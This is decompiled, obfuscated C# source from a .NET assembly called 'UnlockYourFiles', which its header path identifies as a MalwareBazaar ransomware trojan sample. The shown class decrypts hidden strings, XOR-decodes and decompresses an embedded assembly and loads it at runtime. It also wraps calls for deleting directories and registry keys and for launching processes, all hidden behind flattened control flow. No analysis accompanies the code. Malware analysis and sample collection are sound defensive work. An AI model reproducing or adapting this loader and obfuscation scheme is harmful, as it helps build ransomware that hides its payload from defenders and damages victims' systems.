// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴃ
// Assembly: UnlockYourFiles, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79C9ABD9-AD70-4EA1-ADC4-FC1CC25178CB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Crypmodng.gen-26e590315030ce530641ac9ea5ecbdd0b22b4f50e5b41e6c3e2d97f7e14e9e14.exe

using LoginModern;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Windows.Forms;
using UnlockYourFiles.Login;

namespace Ⴈ
{
  internal static class Ⴃ
  {
    internal static Ⴈ.Ⴃ.Ⴅ Ⴃ;
    private static readonly char[] ႷႨ;
    private static readonly char[] ႷႰ = new char[8]
    {
      char.MinValue,
      '\u0005',
      char.MinValue,
      '㐯',
      'ၲ',
      'ℤ',
      '⎳',
      '㬇'
    };
    private static readonly string[] ႷႳ;
    internal static Ⴈ.Ⴃ.ႷႤ ႷႭ;

    [SecuritySafeCritical]
    [STAThread]
    private static void Ⴀ()
    {
      UnlockYourFiles.Properties.Resources.ႣႤ();
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            registro.ႭႨ(false, 7, 13);
            num = 1;
            continue;
          case 1:
          case 4:
            goto label_4;
          default:
            Ⴈ.Ⴃ.ႠႨ(767, 719);
            goto case 0;
        }
      }
label_4:
      Application.Run((Form) new login());
    }

    internal static Assembly Ⴗ([In] object obj0, [In] ResolveEventArgs obj1) => Ⴈ.Ⴃ.Ⴈ(obj1, __fieldref (Ⴈ.Ⴃ.Ⴃ), 15819, "81c5fc0d-3ddd-44b6-810e-7c1ce636d3de", 230);

    internal static Assembly Ⴈ(
      ResolveEventArgs args,
      RuntimeFieldHandle resourceField,
      int resourceLength,
      string nameGuid,
      int offset)
    {
label_3:
      while (resourceLength > 0)
      {
        int num1 = 11;
        Assembly assembly;
        string name;
        AppDomain appDomain;
        Dictionary<string, string> dictionary;
        byte[] buffer;
        int index1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = index1 < resourceLength ? 8 : 1;
              continue;
            case 1:
              goto label_16;
            case 2:
              goto label_6;
            case 3:
              appDomain = UnlockYourFiles.Properties.Resources.ႣႰ(588, 554);
              dictionary = (Dictionary<string, string>) registro.ႳႨ(appDomain, nameGuid, 27, 84);
              num1 = 12;
              continue;
            case 4:
            case 9:
              dictionary = new Dictionary<string, string>();
              msgbox.ႷႠ(appDomain, nameGuid, (object) dictionary, 81, 47);
              buffer = new byte[resourceLength];
              num1 = 10;
              continue;
            case 6:
            case 14:
              goto label_3;
            case 7:
            case 11:
              assembly = UnlockYourFiles.Properties.Resources.ႣႭ(373, 376);
              num1 = !UnlockYourFiles.Properties.Resources.ႣႷ(UnlockYourFiles.Properties.Resources.ႣႠ(args, 842, 795), assembly, 57, 48) ? 15 : 2;
              continue;
            case 8:
              buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
              num1 = 13;
              continue;
            case 10:
              UnlockYourFiles.Properties.Resources.ႣႨ((Array) buffer, resourceField, 453, 426);
              index1 = 0;
              num1 = 0;
              continue;
            case 12:
              if (dictionary == null)
              {
                num1 = 4;
                continue;
              }
              goto label_35;
            case 13:
              ++index1;
              num1 = 0;
              continue;
            case 15:
              name = Ⴈ.Ⴗ.ႤႠ(nameGuid, Ⴈ.Ⴃ.ႷႷ(3229828, 6), 405, 483);
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.Ⴈ);
              num1 = 6;
              continue;
          }
        }
label_6:
        return (Assembly) null;
label_16:
        MemoryStream memoryStream = new MemoryStream();
        DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
        try
        {
          int num2 = 5;
          byte[] numArray;
          int num3;
          while (true)
          {
            switch (num2)
            {
              case 1:
                Ⴈ.Ⴃ.ႷႼ((Stream) memoryStream, numArray, 0, num3, 781, 811);
                goto case 2;
              case 2:
              case 4:
                num2 = (num3 = Ⴈ.Ⴗ.ႤႳ((Stream) deflateStream, numArray, 0, numArray.Length, 1018, 952)) > 0 ? 1 : 7;
                continue;
              case 7:
                goto label_27;
              default:
                numArray = new byte[1024];
                num2 = 2;
                continue;
            }
          }
        }
        finally
        {
          int num4 = 3;
          while (true)
          {
            switch (num4)
            {
              case 1:
              case 2:
              case 4:
              case 5:
                goto label_25;
              case 6:
                goto label_26;
              default:
                num4 = deflateStream == null ? 6 : 1;
                continue;
            }
          }
label_25:
          deflateStream.Dispose();
label_26:;
        }
label_27:
        int num5 = 7;
label_28:
        Assembly data;
        string[] manifestResourceNames;
        int index2;
        while (true)
        {
          switch (num5)
          {
            case 0:
              goto label_38;
            case 1:
            case 12:
              appDomain.SetData(name, (object) data);
              goto case 8;
            case 2:
              goto label_37;
            case 4:
            case 6:
              num5 = index2 < manifestResourceNames.Length ? 10 : 9;
              continue;
            case 5:
              num5 = !dictionary.ContainsKey(args.Name) ? 0 : 2;
              continue;
            case 8:
              manifestResourceNames = data.GetManifestResourceNames();
              index2 = 0;
              num5 = 4;
              continue;
            case 9:
              num5 = 5;
              continue;
            case 10:
              string key = manifestResourceNames[index2];
              dictionary[key] = key;
              ++index2;
              num5 = 4;
              continue;
            case 11:
              goto label_35;
            default:
              data = msgbox.ႷႭ(msgbox.ႷႣ(memoryStream, 99, 82), (byte[]) null, UnlockYourFiles.Properties.Resources.ႣႼ(assembly, 672, 652), 261, 287);
              num5 = 1;
              continue;
          }
        }
label_37:
        return data;
label_35:
        data = (Assembly) appDomain.GetData(name);
        num5 = 5;
        goto label_28;
      }
label_38:
      return (Assembly) null;
    }

    [SecuritySafeCritical]
    internal static void Ⴄ([In] Form obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 4:
            goto label_7;
          case 2:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 118:
                num2 = 0;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Close();
    }

    [SecuritySafeCritical]
    internal static void Ⴍ([In] Control obj0, [In] Cursor obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_8;
          case 3:
          case 5:
            num1 = 0;
            continue;
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 6:
                num2 = 4;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Cursor = obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴜ([In] string obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
            num1 = 3;
            continue;
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 48:
                num2 = 5;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Directory.Delete(obj0, obj1);
    }

    [SecuritySafeCritical]
    internal static DialogResult ႣႥ([In] Form obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 60:
          num1 = 1;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_8;
          case 2:
          case 7:
            num2 = 5;
            continue;
          case 3:
          case 5:
            goto label_3;
          case 4:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႥ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.ShowDialog();
    }

    [SecuritySafeCritical]
    internal static void ႣႣ([In] Component obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 3:
          case 4:
          case 5:
            goto label_7;
          case 2:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 56:
                num2 = 1;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Dispose();
    }

    [SecuritySafeCritical]
    internal static Process ႣႠ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 55:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_8;
          case 2:
            num2 = 6;
            continue;
          case 3:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႠ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return Process.Start(obj0);
    }

    [SecuritySafeCritical]
    internal static string ႣႷ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 5:
          num1 = 2;
          break;
        case 6:
          num1 = 3;
          break;
        case 7:
          num1 = 1;
          break;
        default:
          num1 = 8;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 5;
            continue;
          case 1:
            goto label_12;
          case 2:
          case 9:
            goto label_10;
          case 3:
            goto label_11;
          case 5:
            goto label_3;
          case 6:
          case 7:
          case 8:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႷ);
            num2 = 5;
            continue;
        }
      }
label_10:
      return Path.GetFileName(obj0);
label_11:
      return Path.GetExtension(obj0);
label_12:
      return obj0.ToLower();
    }

    [SecuritySafeCritical]
    internal static byte[] ႣႨ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 111:
          num1 = 5;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 3:
          case 4:
          case 6:
            num2 = 1;
            continue;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႨ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return File.ReadAllBytes(obj0);
    }

    [SecuritySafeCritical]
    internal static System.Type ႣႰ([In] RuntimeTypeHandle obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 86:
          num1 = 5;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
          case 6:
            goto label_3;
          case 4:
          case 7:
            num2 = 1;
            continue;
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႰ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return System.Type.GetTypeFromHandle(obj0);
    }

    [SecuritySafeCritical]
    internal static object ႣႳ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 119:
          num1 = 1;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
          case 2:
          case 3:
            goto label_8;
          case 4:
          case 7:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႣႳ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.GetObject(obj1);
    }

    [SecuritySafeCritical]
    internal static void ႣႤ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
            goto label_9;
          case 2:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 53:
                num2 = 0;
                break;
              case 54:
                goto label_8;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_9:
      return;
label_7:
      obj0.Name = obj1;
      return;
label_8:
      obj0.Text = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႣႭ([In] Control obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 1;
            continue;
          case 2:
            goto label_8;
          case 3:
          case 4:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 54:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Size = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႣႼ([In] PictureBox obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 2:
            goto label_7;
          case 3:
            goto label_8;
          case 4:
            num1 = 1;
            continue;
          case 5:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 77:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.TabStop = obj1;
    }

    [SecuritySafeCritical]
    internal static System.Drawing.Color ႠႥ(
      [In] int obj0,
      [In] int obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 107:
          num1 = 3;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
          case 7:
            goto label_8;
          case 1:
          case 5:
            num2 = 4;
            continue;
          case 2:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႠႥ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return System.Drawing.Color.FromArgb(obj0, obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static System.Drawing.Color ႠႣ([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 44:
          num1 = 1;
          break;
        case 45:
          num1 = 8;
          break;
        case 46:
          num1 = 6;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 8:
            goto label_11;
          case 1:
            goto label_10;
          case 3:
            num2 = 5;
            continue;
          case 4:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          case 6:
          case 9:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႠႣ);
            num2 = 5;
            continue;
        }
      }
label_10:
      return System.Drawing.Color.White;
label_11:
      return System.Drawing.Color.LightGray;
label_12:
      return System.Drawing.Color.DimGray;
    }

    [SecuritySafeCritical]
    internal static void ႠႠ([In] ButtonBase obj0, [In] FlatStyle obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 2:
          case 5:
            goto label_7;
          case 3:
            goto label_8;
          case 4:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 28:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.FlatStyle = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႠႷ([In] ButtonBase obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_7;
          case 3:
            goto label_8;
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 47:
                num2 = 0;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.UseVisualStyleBackColor = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႠႨ([In] int obj0, [In] int obj1)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_7;
          case 2:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj1 ^ obj0)
            {
              case 48:
                num2 = 4;
                break;
              case 49:
                goto label_8;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Application.EnableVisualStyles();
      return;
label_8:
      Application.Exit();
    }

    [SecuritySafeCritical]
    internal static int ႠႳ([In] CreateParams obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 61:
          num1 = 7;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 4:
          case 7:
            goto label_8;
          case 3:
            num2 = 1;
            continue;
          case 6:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႠႳ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.ExStyle;
    }

    [SecuritySafeCritical]
    internal static void ႠႤ([In] Form obj0, [In] FormBorderStyle obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 3:
            num1 = 4;
            continue;
          case 2:
            goto label_8;
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 39:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.FormBorderStyle = obj1;
    }

    [SecuritySafeCritical]
    internal static byte[] ႠႭ([In] Encoding obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 61:
          num1 = 3;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 6;
            continue;
          case 2:
          case 4:
            num2 = 6;
            continue;
          case 3:
          case 5:
            goto label_8;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႠႭ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.GetBytes(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႠႼ([In] Encoding obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 29:
          num1 = 1;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_3;
          case 1:
          case 2:
            goto label_8;
          case 3:
          case 5:
            num2 = 4;
            continue;
          case 7:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႠႼ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.GetString(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႷႥ([In] ProcessModule obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 61:
          num1 = 2;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_8;
          case 1:
          case 4:
            num2 = 5;
            continue;
          case 3:
          case 6:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴃ.ႷႥ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.FileName;
    }

    [SecuritySafeCritical]
    internal static void ႷႣ([In] RegistryKey obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 2:
            goto label_8;
          case 3:
            goto label_7;
          case 4:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 29:
                num2 = 3;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.DeleteSubKey(obj1);
    }

    [SecuritySafeCritical]
    internal static void ႷႠ([In] LinkLabel obj0, [In] System.Drawing.Color obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 3:
            goto label_7;
          case 4:
            num1 = 1;
            continue;
          case 5:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 2:
                num2 = 3;
                break;
              case 3:
                goto label_8;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_9:
      return;
label_7:
      obj0.ActiveLinkColor = obj1;
      return;
label_8:
      obj0.LinkColor = obj1;
    }

    static Ⴃ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        'ဿ'
      };
      chArray[0] = '㐂';
      chArray[5] = '⟒';
      chArray[2] = 'ℕ';
      chArray[1] = '၇';
      chArray[3] = '⎊';
      chArray[6] = '⪒';
      chArray[4] = '㭅';
      Ⴈ.Ⴃ.ႷႳ = new string[1];
      Ⴈ.Ⴃ.ႷႨ = chArray;
    }

    internal static string ႷႷ([In] int obj0, [In] int obj1)
    {
      int index1 = obj0 ^ 3229826 ^ obj1;
      char[] ⴗⴐ = Ⴈ.Ⴃ.ႷႰ;
      int index2 = (int) ⴗⴐ[index1];
      string str1;
      if ((str1 = Ⴈ.Ⴃ.ႷႳ[index2]) != null)
        return str1;
      int num1 = (int) ⴗⴐ[index1 + 1];
      int length1 = ((int) ⴗⴐ[index1 + 2] << 16) + num1;
      char[] chArray = new char[length1];
      char[] ⴗⴈ = Ⴈ.Ⴃ.ႷႨ;
      int length2 = ⴗⴈ.Length;
      int num2 = index1 + 3;
      for (int index3 = 0; index3 < length1; index3 = 1 + index3)
        chArray[index3] = (char) ((uint) ⴗⴐ[num2 + index3] ^ (uint) ⴗⴈ[(index3 + index2) % length2]);
      string str2 = new string(chArray);
      Ⴈ.Ⴃ.ႷႳ[index2] = str2;
      return str2;
    }

    [SecuritySafeCritical]
    internal static void ႷႼ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 38)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 15819, Pack = 1)]
    private struct Ⴅ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴐ
    {
      internal IContainer Ⴄ;
      internal Panel Ⴃ;
      internal Label Ⴅ;
      internal Button Ⴀ;
      internal PictureBox Ⴗ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴓ
    {
      internal IContainer Ⴄ;
      internal PictureBox Ⴓ;
      internal PictureBox Ⴗ;
      internal Label Ⴃ;
      internal Button Ⴍ;
      internal Label Ⴈ;
      internal Label Ⴀ;
      internal TextBox Ⴅ;
      internal TextBox Ⴐ;
      internal Label Ⴜ;
      internal Label ႳႤ;
      internal Label ႳႳ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႠႰ
    {
      internal int Ⴅ;
      internal string Ⴄ;
      internal string Ⴀ;
      internal string[] Ⴓ;
      internal string[] Ⴍ;
      internal IContainer Ⴈ;
      internal Panel Ⴃ;
      internal TextBox Ⴗ;
      internal Label Ⴐ;
      internal Button Ⴜ;
      internal PictureBox ႤႥ;
      internal PictureBox ႤႤ;
      internal PictureBox ႤႠ;
      internal LinkLabel ႤႳ;
      internal Label ႤႭ;
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct ႷႤ
    {
    }
  }
}
